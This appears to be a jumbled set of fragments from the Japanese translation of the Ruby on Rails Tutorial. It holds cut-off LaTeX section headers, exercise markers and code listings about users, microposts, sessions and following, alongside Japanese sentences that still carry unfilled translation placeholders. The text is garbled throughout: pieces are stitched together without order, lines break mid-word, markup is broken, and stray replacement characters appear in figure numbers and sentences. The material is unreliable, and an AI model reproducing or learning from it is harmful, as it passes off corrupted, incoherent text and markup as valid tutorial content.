アプリ名をあえて具体的にしていないことからわかるように、\emph{Ruby on Railsチュートリアル}で開発するアプリケーションでは、特定のWebサービスに偏らない一般的な記述を心がけており、読者の目的にかかわらず本チュートリアルでWeb開発の基礎を学ぶことができます。
it.<n><n>    \subsection{開発環境}<n>    \label{sec:development_environment}<n><n>
\label{fig:cloud9_two_spaces}}<n>\end{figure}<n><n>\subsection{Railsをインストールする} % (fold)<n>\label{sec:installing_rails}<n><n>The development environment from Section~\ref{sec:development_environment} includes all the software we need to get started except for Rails itself.
 getting results consistent with this tutorial.<n><n>% subsection installing_rails (end)<n><n>    \section{最初のアプリケーション}<n>    \label{sec:the_hello_application}<n><n>Following a \href{http://www.catb.org/jargon/html/H/hello-world.html}{long tradition} in computer programming, our goal for the first application is to write a ``
d='ex-ce3907'></span><n>\end{enumerate}<n><n>\begin{figure}<n>\begin{center}<n>\image{images/figures/hola_mundo.png}<n>\end{center}<n>\caption{Changing the root route to return ``¡Hola, mundo!''.\label{fig:hola_mundo}}<n>\end{figure}<n><n>\begin{figure}<n>\begin{center}<n>\image{images/figures/goodbye_world.png}<n>\end{center}<n>\caption{Changing the root route to return ``goodbye, world!''.\label{fig:goodbye_world}}<n>\end{figure}<n><n>% subsection hello_world (end)<n><n>  % section up_and_running (end)<n><n>  \section{Gitによるバージョン管理} % (fold)<n>  \label{sec:version_control}<n><n>
<n><n>    \subsection{Gitのメリット}<n>    \label{sec:what_good_does_git_do_you}<n><n>If you've never used version control before, it may not be entirely clear at this point what good it does you, so let me give just one example.
<n><n>    \subsection{Herokuにデプロイする (2)}<n>    \label{sec:heroku_step_two}<n><n>There is no step two!
te}<n><n>    \subsection{Herokuコマンド}<n>    \label{sec:heroku_commands}<n><n>
on deploying (end)<n><n>  \section{最後に} % (fold)<n>  \label{sec:beginning_conclusion}<n><n>
ide the IDE itself.)<n><n>    \subsection{ユーザーページを探検する} % (fold)<n>    \label{sec:a_user_tour}<n><n>
alid email address, like ``@example.com''?<n>%= <span class='exercise' id='ex-6accd1'></span><n><n>  \item Destroy each of the users created in the previous exercises. Does Rails display a message by default when a user is destroyed?<n>%= <span class='exercise' id='ex-abc7bd'></span><n>\end{enumerate}<n><n>    % subsection a_user_tour (end)<n><n>    \subsection{MVCの挙動} % (fold)<n>    \label{sec:mvc_in_action}<n><n>
merate}<n><n>    % subsection mvc_in_action (end)<n><n>    \subsection{Usersリソースの欠点} % (fold)<n>    \label{sec:weaknesses_of_this_users_resource}<n><n>
  validates FILL_IN, presence: true    # Replace FILL_IN with the right code.<n>  validates FILL_IN, presence: true    # Replace FILL_IN with the right code.<n>end<n>\end{code}<n>\end{codelisting}<n><n>\begin{figure}<n>\begin{center}<n>\image{images/figures/user_presence_validations.png}<n>\end{center}<n>\caption{The effect of presence validations on the User model.\label{fig:user_presence_validations}}<n>\end{figure}<n><n>    % subsection demo_user_has_many_microposts (end)<n><n>    \subsection{継承の階層} % (fold)<n>    \label{sec:inheritance_hierarchies}<n><n>
te}<n><n>    % subsection inheritance_hierarchies (end)<n><n>    \subsection{アプリケーションをデプロイする} % (fold)<n>    \label{sec:deploying_the_toy_app}<n><n>
{code:demo_length_validation} works on the production app.<n>%= <span class='exercise' id='ex-debcc6'></span><n>\end{enumerate}<n><n>  \section{最後に} % (fold)<n>  \label{sec:toy_app_conclusion}<n><n>
_app_setup (end)<n><n>  \section{静的ページ} % (fold)<n>  \label{sec:static_pages}<n><n>
 <span class='exercise' id='ex-b6b114'></span><n>\end{enumerate}<n><n>% subsection generated_static_pages (end)<n><n>\subsection{静的なページの調整} % (fold)<n>\label{sec:custom_static_pages}<n><n>
<n>\end{code}<n>\end{codelisting}<n><n><n>    % subsection testing_titles (end)<n><n>    \subsection{タイトルを追加する (Green)} % (fold)<n>    \label{sec:adding_page_titles}<n><n>
\end{code}<n>\end{codelisting}<n><n>    % subsection adding_page_titles (end)<n><n>    \subsection{レイアウトと埋め込みRuby (Refactor)} % (fold)<n>    \label{sec:layouts_and_embedded_ruby}<n><n>
d{code}<n>\end{codelisting}<n><n><n>\subsection{ルーティングの設定} % (fold)<n>\label{sec:setting_the_root_route}<n><n>
}<n><n>% subsection setting_the_root_route (end)<n><n>  % section slightly_dynamic_pages (end)<n><n>  \section{最後に} % (fold)<n>  \label{sec:static_pages_conclusion}<n><n>Seen from the outside, this chapter hardly accomplished anything: we started with static pages, and ended with\ldots\ \emph{mostly} static pages. 
\subsection{Backtraceサイレンサー} % (fold)<n>%
   % subsection backtrace_silencer (end)<n><n>  \subsection{Guardによるテストの自動化} % (fold)<n>  \label{sec:guard}<n><n>
-b updating-users<n>\end{code}<n><n>    \subsection{編集フォーム} % (fold)<n>    \label{sec:edit_form}<n><n>We start with the edit form, whose mockup appears in Figure~\ref{fig:edit_user_mockup}.\footnote{Image retrieved 
umerate}<n><n>    % subsection unsuccessful_edits (end)<n><n>    \subsection{編集失敗時のテスト} % (fold)<n>    \label{sec:testing_unsuccessful_edits}<n><n>
g the text ``The form contains 4 errors.''<n>%= <span class='exercise' id='ex-faa5fa'></span><n>\end{enumerate}<n><n>    % subsection testing_unsuccessful_edits (end)<n><n>    \subsection{TDDで編集を成功させる} % (fold)<n>    \label{sec:successful_edits}<n><n>
u change the email address to one without an associated Gravatar?<n>%= <span class='exercise' id='ex-05aa0f'></span><n>\end{enumerate}<n><n>    % subsection enabling_edits (end)<n><n>  % section updating_users (end)<n><n>  \section{認可} % (fold)<n>  \label{sec:authorization}<n><n>
umerate}<n><n>    % subsection requiring_logged_in_users (end)<n><n>    \subsection{正しいユーザーを要求する} % (fold)<n>    \label{sec:requiring_the_right_user}<n><n>
te}<n><n>    % subsection requiring_the_right_user (end)<n><n>    \subsection{フレンドリーフォワーディング} % (fold)<n>    \label{sec:friendly_forwarding}<n><n>
<n>\end{enumerate}<n><n>    % subsection friendly_forwarding (end)<n><n>  % section protecting_pages (end)<n><n>  \section{すべてのユーザーを表示する} % (fold)<n>  \label{sec:showing_all_users}<n><n>
umerate}<n><n>    % subsection user_index (end)<n><n>    \subsection{サンプルのユーザー} % (fold)<n>    \label{sec:sample_users}<n><n>
umerate}<n><n>    % subsection sample_users (end)<n><n>    \subsection{ページネーション} % (fold)<n>    \label{sec:pagination}<n><n>
<n><n>% subsection user_index_test (end)<n><n>    \subsection{パーシャルのリファクタリング} % (fold)<n>    \label{sec:partial_refactoring}<n><n>
ting tests are \failing.<n>%= <span class='exercise' id='ex-d0d59d'></span><n>\end{enumerate}<n><n>    % subsection partial_refactoring (end)<n><n>  % section showing_users (end)<n><n>  \section{ユーザーを削除する} % (fold)<n>  \label{sec:deleting_users}<n><n>
<n><n>% subsection user_destroy_tests (end)<n><n>  % section deleting_users (end)<n><n>  \section{最後に} % (fold)<n>  \label{sec:updating_and_deleting_users_conclusion}<n><n>
      \subsection{Micropostのバリデーション} % (fold)<n>      \label{sec:micropost_validations}<n><n>
<n><n>\end{enumerate}<n><n>    % subsection micropost_validations (end)<n><n>    \subsection{User/Micropostの関連付け} % (fold)<n>    \label{sec:user_micropost_associations}<n><n>
<n><n>\end{enumerate}<n><n>    % subsection user_micropost_associations (end)<n><n>    \subsection{マイクロポストを改良する} % (fold)<n>    \label{sec:ordering_and_dependency}<n><n>
ing \kode{Micropost.find} that the user's first micropost was also destroyed.<n>%= <span class='exercise' id='ex-ec2e6b'></span><n><n>\end{enumerate}<n><n>    % subsection ordering_and_dependency (end)<n><n>  % section a_micropost_model (end)<n><n>  \section{マイクロポストを表示する} % (fold)<n>  \label{sec:showing_microposts}<n><n>
n class='exercise' id='ex-df8fbd'></span><n>\end{enumerate}<n><n>    % subsection rendering_microposts (end)<n><n>    \subsection{マイクロポストのサンプル} % (fold)<n>    \label{sec:sample_microposts}<n><n>
exercise' id='ex-c6f975'></span><n>\end{enumerate}<n><n>    % subsection sample_microposts (end)<n><n>\subsection{プロフィール画面におけるマイクロポストのテスト} % (fold)<n>\label{sec:profile_micropost_tests}<n><n>
n><n>\end{enumerate}<n><n>% subsection profile_micropost_tests (end)<n><n>  % section showing_microposts (end)<n><n>  \section{マイクロポストを操作する} % (fold)<n>  \label{sec:manipulating_microposts}<n><n>
n><n>\end{enumerate}<n><n>    % subsection access_control (end)<n><n>    \subsection{マイクロポストを作成する} % (fold)<n>    \label{sec:creating_microposts}<n><n>
umerate}<n><n>    % subsection creating_microposts (end)<n><n>    \subsection{フィードの原型} % (fold)<n>    \label{sec:a_proto_feed}<n><n>
are all the same. \emph{Hint}: It's probably easiest to compare directly using \kode{==}.<n>%= <span class='exercise' id='ex-e4ef4b'></span><n>\end{enumerate}<n><n>    % subsection a_proto_feed (end)<n><n>    \subsection{マイクロポストを削除する} % (fold)<n>    \label{sec:destroying_microposts}<n><n>
te}<n><n>    % subsection destroying_microposts (end)<n><n>\subsection{フィード画面におけるマイクロポストのテスト} % (fold)<n>\label{sec:micropost_tests}<n><n>
<n>    other_user = users(:malory)<n>    log_in_as(other_user)<n>    get root_path<n>    assert_match "0 microposts", response.body<n>    other_user.microposts.create!(content: "A micropost")<n>    get root_path<n>    assert_match FILL_IN, response.body<n>  end<n>end<n>\end{code}<n>\end{codelisting}<n><n>% subsection micropost_tests (end)<n><n>  % section manipulating_microposts (end)<n><n><n>  \section{マイクロポストの画像投稿} % (fold)<n>  \label{sec:micropost_images}<n><n>
ubsection basic_image_upload (end)<n><n><n>\subsection{画像の検証} % (fold)<n>\label{sec:image_validation}<n><n>
end{enumerate}<n><n>% subsection image_validation (end)<n><n>\subsection{画像のリサイズ} % (fold)<n>\label{sec:image_resizing}<n><n>
sting}<n><n>\subsection{本番環境での画像アップロード} % (fold)<n>\label{sec:image_upload_in_production}<n><n>
bsection image_upload_in_production (end)<n><n>  % section micropost_images (end)<n><n>  \section{最後に} % (fold)<n>  \label{sec:user_microposts_conclusion}<n><n>With the addition of the Microposts resource, we are nearly finished with our sample application.
\chapter{ユーザーをフォローする}<n>\label{cha:following_users}<n><n>
<n>\end{enumerate}<n><n>    % subsection a_problem_with_the_data_model (end)<n><n>    \subsection{User/relationshipの関連付け} % (fold)<n>    \label{sec:relationship_user_associations}<n><n>
end{enumerate}<n><n>    % subsection relationship_user_associations (end)<n><n>    \subsection{Relationshipのバリデーション} % (fold)<n>    \label{sec:relationship_validations}<n><n>
ge as of Rails~5, and in previous versions of Rails the validations are required. We'll plan to leave them in for completeness, but it's worth bearing in mind that you may see these validations omitted in other people's code.)<n>%= <span class='exercise' id='ex-0003a9'></span><n>\end{enumerate}<n><n>    % subsection relationship_validations (end)<n><n>    \subsection{フォローしているユーザー} % (fold)<n>    \label{sec:following}<n><n>
ex-b4bbb0'></span><n><n>\end{enumerate}<n><n>    % subsection sample_following_data (end)<n><n>    \subsection{統計とフォロー用フォーム} % (fold)<n>    \label{sec:stats_and_a_follow_form}<n><n>
<n><n>    \subsection{[フォローする] ボタン (標準的な方法)} % (fold)<n>    \label{sec:a_working_follow_button_the_standard_way}<n><n>
umerate}<n><n>    % subsection a_working_follow_button_the_standard_way (end)<n><n>    \subsection{[フォローする] ボタン (Ajax)} % (fold)<n>    \label{sec:a_working_follow_button_with_ajax}<n><n>
umerate}<n><n>    % subsection a_working_follow_button_with_ajax (end)<n><n>  \subsection{フォローをテストする} % (fold)<n>  \label{sec:following_tests}<n><n>
in the previous exercise would catch it.<n>%= <span class='exercise' id='ex-90699b'></span><n><n>\end{enumerate}<n><n>  % subsection following_tests (end)<n><n>  % section a_web_interface_for_following_and_followers (end)<n><n>  \section{ステータスフィード} % (fold)<n>  \label{sec:the_status_feed}<n><n>
n><n>\end{enumerate}<n><n>    % subsection motivation_and_strategy (end)<n><n>    \subsection{フィードを初めて実装する} % (fold)<n>    \label{sec:a_first_feed_implementation}<n><n>With the status feed design requirements captured in the test from Listing \ref{code:full_feed_test}, we're ready to start writing the feed. 
_first_feed_implementation (end)<n><n>    \subsection{サブセレクト} % (fold)<n>    \label{sec:scopes_subselects_and_a_lambda}<n><n>
nd<n>  end<n>end<n>\end{code}<n>\end{codelisting}<n><n>    % subsection scopes_subselects_and_a_lambda (end)<n><n>  \section{最後に} % (fold)<n>  \label{sec:following_conclusion}<n><n>
 \emph{Hint}: Use \kode{user.reload} to retrieve the new value.<n>%= <span class='exercise' id='ex-140f50'></span><n><n>\end{enumerate}<n><n>% subsection updating_the_reset (end)<n><n>\subsection{パスワードの再設定をテストする} % (fold)<n>\label{sec:password_reset_test}<n><n>
mail_in_production (end)<n><n>% section password_reset (end)<n><n>\section{最後に} % (fold)<n>\label{sec:resets_conclusion}<n><n>
<n><n>\section{AccountActivationsリソース} % (fold)<n>\label{sec:account_activations_resource}<n><n>
 (end)<n><n>\section{アカウントを有効化する} % (fold)<n>\label{sec:activating_the_account}<n><n>
n_edit_action (end)<n><n>% section activating_the_account (end)<n><n>\subsection{有効化のテストとリファクタリング} % (fold)<n>\label{sec:activation_test_and_refactoring}<n><n>
listing}<n><n>\subsection{ログイン状態の保持} % (fold)<n>\label{sec:login_with_remembering}<n><n>
}<n><n>% subsection login_with_remembering (end)<n><n>\subsection{ユーザーを忘れる} % (fold)<n>\label{sec:forgetting_users}<n><n>
getting_users (end)<n><n>\subsection{２つの目立たないバグ} % (fold)<n>\label{sec:two_subtle_bugs}<n><n>
}<n><n>% subsection two_subtle_bugs (end)<n><n>\section{``Remember me チェックボックス} % (fold)<n>\label{sec:remember_me_checkbox}<n><n>
ection{Exercises}<n>\label{sec:exercises_remember_me}<n><n>\input{fragments/society_exercises_note}<n><n>\begin{enumerate}<n>  \item By inspecting your browser's cookies directly, verify that the ``remember me'' checkbox is having its intended effect.<n>%= <span class='exercise' id='ex-0c1e96'></span><n><n>  \item At the console, invent examples showing both possible behaviors of the ternary operator (Box~\ref{aside:ternary_operator}).<n>%= <span class='exercise' id='ex-63ac73'></span><n>\end{enumerate}<n><n>% section remember_me (end)<n><n>\section{Rememberのテスト} % (fold)<n>\label{sec:remember_tests}<n><n>
  \section{最後に} % (fold)<n>  \label{sec:advanced_login_conclusion}<n><n>
<n><n>\subsection{本章のまとめ} % (fold)<n>\label{sec:advanced_
<n><n>  \section{セッション}<n>  \label{sec:sessions_and_failed_login}<n><n>
in<n>\end{code}<n><n>    \subsection{Sessionsコントローラ} % (fold)<n>    \label{sec:sessions_controller}<n><n>
ults of \kode{rails routes} to \kode{grep}, list all the routes associated with the Users resource. Do the same for Sessions. How many routes does each resource have? \emph{Hint}: Refer to the \href{https://www.learnenough.com/command-line-tutorial#sec-grepping}{section on grep} in \lecl.<n>%= <span class='exercise' id='ex-061c5c'></span><n>\end{enumerate}<n><n>    % subsection sessions_controller (end)<n><n>  \subsection{ログインフォーム} % (fold)<n>  \label{sec:login_form}<n><n>
umerate}<n><n>    % subsection login_form (end)<n><n>    \subsection{ユーザーの検索と認証} % (fold)<n>    \label{sec:finding_and_authenticating_a_user}<n><n>
umerate}<n><n>    % subsection finding_and_authenticating_a_user (end)<n><n>    \subsection{フラッシュメッセージを表示する} % (fold)<n>    \label{sec:rendering_with_a_flash_message}<n><n>
ge.<n>%= <span class='exercise' id='ex-2e6353'></span><n>\end{enumerate}<n><n>  % subsection a_flash_test (end)<n><n>  % section login_failure (end)<n><n>  \section{ログイン} % (fold)<n>  \label{sec:logging_in}<n><n>
te}<n><n>    % subsection a_working_log_in_method (end)<n><n><n>\subsection{現在のユーザー} % (fold)<n>\label{sec:current_user}<n><n>
ubsection current_user (end)<n><n>    \subsection{レイアウトリンクを変更する} % (fold)<n>    \label{sec:changing_the_layout_links}<n><n>
n this step (Box~\ref{aside:technical_sophistication}).)<n>%= <span class='exercise' id='ex-df67d8'></span><n>\end{enumerate}<n><n>    % subsection changing_the_layout_links (end)<n><n>    \subsection{レイアウトの変更をテストする} % (fold)<n>    \label{sec:testing_layout_changes}<n><n>
umerate}<n><n>    % subsection layout_link_tests (end)<n><n>    \subsection{ユーザー登録時にログイン} % (fold)<n>    \label{sec:login_upon_signup}<n><n>
<n>\end{enumerate}<n><n>    % subsection login_upon_signup (end)<n><n>  % section login_success (end)<n><n>  \section{ログアウト} % (fold)<n>  \label{sec:logging_out}<n><n>
  end
  else
A generalized \kode{authenticated?} 
Using the generalized \kode{authenticated?} 
これはリスト\ref{code:show_only_とctive_users_exercise}で使用されていました。
このTo get this to work, we need to define the \kode{password_reset_expired?}
  Initial commit
(The MIT License)
As long as you retain this notice you
                     WHERE follower_id = :user_id"
selfを省略した結果をリスト\ref{code:users_controller_test_login_route}に示します。
PATCH
このコードはリスト\ref{code:login_upon_signup}で使用されていました。もうひとつ、
       route  resources :users
       route  resources :microposts
=> [#<Micropost id: 1, content: "First micropost!", user_id: 1, <n>created_at: "2011-11-03 02:37:37", updated_at: "2011-11-03 02:37:37">,
  Loading development environment
  >> Rails.env
  => "development"
  >> Rails.env.development?
  >> Rails.env.test?
  => false
上のように、Railsには\texttt{Rails}というオブジェクトがあり、それには\texttt{env}という属性があります。この属性は環境の論理値 (boolean) を取り、attribute and associated environment boolean methods, so that, for example, \texttt{Rails.env.test?}
  Loading test environment
  => "test"
  => "production"
  >> Rails.env.production?
  end
  This is the home page for the
  sample application.
  Get help on the Ruby on Rails Tutorial at the
  To get help on this sample app, see the
 | Ruby on Rails Tutorial Sample App
=> #<User:0x225167c @email="mhartl@example.com",<n>@name="Michael Hartl">
  $ rails console
A test of \kode{authenticated?} 
Updating \kode{authenticated?} 
\href{https://twitter.com/colmtuite}{Colm Tuite}の多大な貢献により、サンプルアプリケーションをBootstrap CSSのフレームワークに�変換することができました。感謝します。
このsqlite3というgemのバージョンを指定する主な方法は2とおりあります。これにより、Railsで使用されるgemのバージョンを「ある程度」制御できます。
幸い、解決策の実装は簡単です。実は、この問題はデータベースレベルでも一意性を強制するだけで解決し{0/ます。
上のコードでは、{p0}で導入した{2}error_messages{/2}パーシャルを再利用しています。
リスト{p0}の{2}@user{/2}インスタンス変数使うと、編集ページがうまく描画されるようになります (図\ref{fig:edit_page})。
ここでもう1つ微妙な点を指摘しておきたいと思います。リスト{p0}の{2}form_for(@user){/2}のコードは、リスト{p3}のコードと{4}完全に{/4}同じです。だとすると、Railsはどうやって新規ユーザー用の\texttt{POST}リクエストとユーザー編集用の\texttt{PATCH}リクエストを区別するのでしょうか。
表{p0}で示した{2}edit_user_path{/2}という名前付きルートと、 リスト\ref{code:persistent_current_user}で定義した{2}current_user{/2}というヘルパーメソッドを使うと、実装が簡単です。
編集の失敗に対するテスト {2}{3}{/3}{3}{4}{/4}{/3}{3}{/3}{/2}
{0}図9.4{/0}{1}\href{http://gravatar.com/}{Gravatar}の画像調整インターフェイス (写真は\href{http://www.michaelhartl.com/}{誰かさん}){/1}。
また、{p0}で紹介した{2}@user.reload{/2}を使って、データベースから最新のユーザー情報を読み込み直して、正しく更新されたかどうかを確認している点にも注目してください。
テストにパスする必要のある、リスト{p0}の{2}update{/2}アクションは、リスト\ref{code:login_upon_signup}に示したように、{2}create{/2}アクション (リスト\ref{code:user_update_action}) の最終的なフォームとほぼ同じです。
パスワードが空のままでも更新できるようにする GREEN{2}{3}{/3}{3}{4}{/4}{/3}{3}{/3}{/2}
このコードを追加したことにより、ユーザー編集ページが動くようになります (図\ref{fig:edit_form_working})。すべてのテストを走らせてみて、{2}{3}{/3}{3}{4}成功{/4}{/3}{3}{/3}{/2}したかどうか確かめてみてください。
今回はユーザーにログインを要求するために、リスト{p0}のように{2}logged_in_user{/2}メソッドを定義して{2}before_action :logged_in_user{/2}という形式で使います
{0}図9.7{/0} {1}保護されたページにアクセスした直後のログインフォーム{/1}
解決策は簡単で、 {p0}で開発した{2}log_in_as{/2}ヘルパー  (リスト\ref{code:test_helper_log_in}) を使うことです。修正した結果をリスト\ref{code:edit_tests_logged_in}に示します。
(リスト{p0}の{2}setup{/2}メソッド内でログイン処理をまとめてしまうことも可能です。しかし、\ref{sec:friendly_forwarding}で片方のテストをログインする\emph{前に}編集ページにアクセスするように変更したいので、ここでまとめてしまっても結局は元に戻すことになってしまいます。)
セキュリティモデルを確認するためにbeforeフィルターをコメントアウトする GREEN{2}{3}{/3}{3}{4}{/4}{/3}{3}{/3}{/2}
beforeフィルターのコメントアウトを元に戻して、 \passing になるかどうか確かめてみましょう (リスト\ref{code:uncommented_before_filter})。
コメントアウトしていた箇所を元に戻すと、テストが{0}{1}{/1}{1}{2}成功{/2}{/1}{1}{/1}{/0}するようになるはずです。
次に、 リスト{p0}で定義した{2}log_in_as{/2}メソッドを使って、{2}edit{/2}アクションと{2}update{/2}アクションをテストします (リスト\ref{code:edit_update_wrong_user_tests})。
このとき、既にログイン済みのユーザーを対象としているため、ログインページではなく�ルートURLにリダイレクトしている点に注意してください。
今度はテストスイートが{0}{1}{/1}{1}{2}成功{/2}{/1}{1}{/1}{/0}するはずです。
転送先のURLを保存する仕組みは、{p0}でユーザーをログインさせたときと同じで、{2}session{/2}変数を使います。
リスト{p0}の{2}store_location{/2}メソッドでは、 リクエストが送られたURLを{2}session{/2}変数の{2}:forwarding_url{/2}キーに格納しています。ただし、{2}GET{/2}リクエストが送られたときだけ格納するようにしておきます。
いつものように、以下を実行してテストスイートが {0}{1}{/1}{1}{2}緑色{/2}{/1}{1}{/1}{/0} (成功) になることを確認してから先に進みましょう。
これでユーザーのインデックスは完全に動くようになり、テストも全て{0}{1}{/1}{1}{2}パス{/2}{/1}{1}{/1}{/0}するようになります。
{0}図9.9{/0} {1}ユーザー一覧ページにユーザーが1人しか表示されていない{/1}
{0}図9.9{/0} {1}ユーザー一覧ページに100人のサンプルユーザーが表示されている{/1}
{0}図9.12{/0} {1}ユーザー一覧の2ページ目{/1}
ユーザー一覧とページネーションに対するテスト 
このテストは{0}{1}{/1}{1}{2}成功{/2}{/1}{1}{/1}{/0}するはずです。
リファクタリングの第一歩は、リスト{p0}のユーザーの{2}li{/2}を{2}render{/2}呼び出しに置き換えることです (リスト\ref{code:index_view_first_refactoring})。
これは間違いなく大きな進歩です。しかしここで終わらせず、さらに改良してみましょう。今度は\kode{render}を\kode{@users}変数に対して\emph{直接}実行します ({2}{3}リスト9.48{/3}{/2})。
これに限らず、リファクタリングを行う場合には、アプリケーションのコードを変更する前と後で必ずテストを実行し、いずれも{0}{1}{/1}{1}{2}成功{/2}{/1}{1}{/1}{/0}になることを確認するようにしてください。
{0}図9.14:{/0} {1}論理値をとる\kode{admin}属性が追加されたUserモデル{/1}
リスト{p0}では、{2}default: false{/2}という引数を{2}add_column{/2}に追加しています。これは、デフォルトでは管理者に\emph{なれない}ということを示すためです
これで、削除に関するコードに対して、よくテストできている状態になりました。テストスイートを走らせると{0}{1}{/1}{1}{2}成功{/2}{/1}{1}{/1}{/0}するはずです。
Ruby on Rails チュートリアル
The \kode{current_user?} 
また、各リンクを\texttt{if}文で囲い、{1/}管理者にだけ削除リンクが表示されるようにしています。
{0}図11.1{/0} {1}Micropostデータモデル{/1}
{0}図11.2{/0} {1}MicropostとそのUserは\kode{belongs_to} (1対1) の関係性がある{/1}
{0}図11.3{/0} {1}UserとそのMicropostは\kode{has_many} (1対多) の関係性がある{/1}
{0}表11.1{/0} {1}user/micropost関連メソッドのまとめ{/1}
正しく関連付けができたら、リスト{p0}の{2}setup{/2}メソッドを修正して、慣習的に正しくマイクロポストを作成してみます (リスト\ref{code:micropost_validity_test_idiomatic})。
リスト\ref{code:micropost_dependency}のコードが正しく動いていれば、テストが{2}{3}{/3}{3}{4}成功{/4}{/3}{3}{/3}するようになります。{/2}
{0}図1�1.4{/0} {1}マイクロポストが表示されたプロフィールページのモックアップ{/1}
(このとき、リスト{p0}と同様に{2}if @user.microposts.any?{/2}を使って、ユーザーのマイクロポストが1つもない場合には空のリストを表示させていない点にも注目してください。)
{0}図11.5{/0} {1}マイクロポスト用のコードのあるユーザープロフィールページ (ただしマイクロポストがない){/1}
{0}図11.6{/0} {1}ユーザープロフィールとスタイルのないマイクロポスト{/1}
各マイクロポストの表示には、3つのどの場合にも、それが作成されてからの時間 ("1分​​前に投稿" など) が表示されていることに注目してください。これはリスト{p0}の{2}time_ago_in_words{/2}メソッドによるものです。
(Applicationヘルパーをインクルードすることで、リスト{p0}の{2}full_title{/2}ヘルパーが利用できている点に注目してください{p3})。
もし\kode{full_title}ヘルパーを使って他のテストもリファクタリングしたくなったら (例えばリスト\ref{code:base_title_test}など)、\kode{test_helper.rb}からApplicationヘルパーをインクルードしてください。
A test for the user profile. {2}{3}{/3}{3}{4}green{/4}{/3}{3}{/3}{/2}
もちろん、シンプルになったということは完成度が\emph{さらに}高まったということの証しであり、退化したわけではありません。{1}{2}第2章{/2}{/1}でscaffoldに頼りきりだった頃からここに至るまでは長い道のりでしたが、今ではscaffoldが生成するような複雑なコードはほとんど不要になりました。
{0}表11.2{/0} {1}Micropostsリソースが提供するリスト\ref{code:microposts_resource}のRESTfulルート{/1}
{0}図11.10{/0} {1}マイクロポスト作成フォームのあるホーム画面のモックアップ{/1}
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
しかし、今回のように “1 microposts” と表示してしまうと英語の文法上誤りになってしまいます。そこで、{p0}で紹介した{2}pluralize{/2}メソッドを使って “1 micropost” や “2 microposts” と表示するように調整しています。
{0}図11.11{/0} {1}新しいマイクロポストフォームのあるHomeページ {/1}
{0}図11.12{/0} {1}エラーが表示されたHomeページ{/1}
図{p0}のモックアップで示したような、ユーザー自身のポストを含むマイクロポストの{2}フィード{/2}がないと不便です
{0}図11.13{/0} {1}試作フィードがあるHomeページのモックアップ{/1}
上のコードを使用せずにあえてリスト\ref{code:proto_status_feed}のコードを利用したのは、{2}{1}第12章{/1}{/2}で必要となる完全なステータスフィードで応用が効くためです。
{0}図11.14{/0} {1}試作フィードのあるHomeページ{/1}
{0}図11.15{/0} {1}新しいマイクロポストを作成した直後のHomeページ{/1}
{0}図11.16{/0} {1}マイクロポストの削除リンクと試作フィードのモックアップ{/1}
このとき、 リスト{p0}の{2}destroy{/2}メソッドではリダイレクトを使っている点に注目してください。
{0}図11.17{/0} {1}2番目に新しいマイクロポストを削除した後のユーザーHomeページ{/1}
既にアプリケーション側のコードは実装してあるので、このテストは{0}{1}{/1}{1}{2}成功{/2}{/1}{1}{/1}{/0}するはずです。
システムによっては、ここで一旦Railsサーバーを再起動させる必要があります。再起動させたらテストスイートを走らせてみてください。{0}{1}{/1}{1}{2}成功{/2}{/1}{1}{/1}{/0}しているはずです。
このときacceptパラメータでは、リスト{p0}で許可したファイル形式を、{2}MIMEタイプ{/2}で指定するようにします。
(訳注: この項はスキップできます。もしうまくいかなければスキップしても大丈夫です) \ref{sec:image_resizing}で実装した画像アップローダーは、開発環境で動かす分には問題ないのですが、本番環境には適していません。これはリスト{p2}の{3}storage :file{/3}という行によって、ローカルのファイルシステムに画像を保存するようになっているからです{p4} (訳注: ただしHerokuのファイルシステムは一時的にしか使え無いので、本番にデプロイするたびに画像が消えます)。
本番環境でクラウドストレージに保存するためには、リスト{p0}のように{2}fog{/2} gemを使うと簡単です。
The \kode{current_user?} 
error
これは以下で使用する最初のアプリケーションです。
[*Ruby on Rails Tutorial*](http://railstutorial.jp/)
ちなみに、ここにflashのテストも追加しておくとよいでしょう。これは演習として残しておきます (\ref{sec:exercises_the_flash})。
新しいパスワードを再設定するためのフォーム (図\ref{fig:forgot_password_form_mockup}) と、Userモデル内のパスワードを変更するためのフォーム (図\ref{fig:reset_password_form_mockup}) が両方必要になるので、今回は\kode{new}、\kode{create}、\kode{edit}、\kode{update}のルーティングも必要になります。
本チュートリアルを進めていれば、どうやっても手順に書いてあるとおりに動かないことがあるでしょう。
ハマりやすい手順についてはできるだけ情報を補うようにしていますが、すべての場合をカバーするのは不可能です。
そうしたトラブルはむしろ技術の理解を深める絶好のチャンスと捉え、頑張って解決してみましょう。
リスト\ref{code:user_index_view}では、\ref{code:gravatar_option_redux}の演習のリスト\ref{sec:signup_exercises}の結果を利用しています。これは、Gravatarヘルパーにデフォルト以外のサイズを指定するオプションを渡します。
nt prerequisites (especially \ler, \les, and \lera).<n><n>  \section{ユーザーを表示する} % (fold)<n>  \label{sec:showing_users}<n><n>
te}<n><n>    % subsection rails_environments (end)<n><n>    \subsection{Usersリソース} % (fold)<n>    \label{sec:a_users_resource}<n><n>
te}<n><n>    % subsection a_users_resource (end)<n><n>\subsection{デバッガー} % (fold)<n>\label{sec:debugger}<n><n>
bsection debugger (end)<n><n>    \subsection{Gravatar画像とサイドバー} % (fold)<n>    \label{sec:a_gravatar_image}<n><n>
ice?<n>%= <span class='exercise' id='ex-d0bbfe'></span><n>\end{enumerate}<n><n>    % subsection using_form_for (end)<n><n>    \subsection{フォームHTML} % (fold)<n>    \label{sec:the_form_html}<n><n>
umerate}<n><n>    % subsection the_form_html (end)<n><n>  \section{ユーザー登録失敗} % (fold)<n>  \label{sec:unsuccessful_signups}<n><n>
te}<n><n>    % subsection the_finished_signup_form (end)<n><n>    \subsection{flash} % (fold)<n>    \label{sec:the_flash}<n><n>
<n><n>    % subsection the_first_signup (end)<n><n>\subsection{成功時のテスト} % (fold)<n>\label{sec:a_test_for_valid_submission}<n><n>
コミット (commit)
ActionView::MissingTemplate:
モデルの継承関係と同様に、UsersコントローラもMicropostsコントローラも最終的には\kode{ActionController::Base}を継承しており、モデルオブジェクトの操作、インバウンドHTTP requestのフィルタ、ビューをHTMLとして出力するなどの多彩な機能を実行できるようになっています。 Since all Rails controllers inherit from {1}ApplicationController{/1}, rules defined in the Application controller automatically apply to every action in the application.
結果は図\ref{fig:sqlite_database_browser}のようになるので、図\ref{fig:user_model_initial}と比べてみてください。
このことから、複数のアサーションを1つのテストにまとめるようにして、(minitestを通して) Rubyにどのセリフで間違ったのかを話させるようにしています。
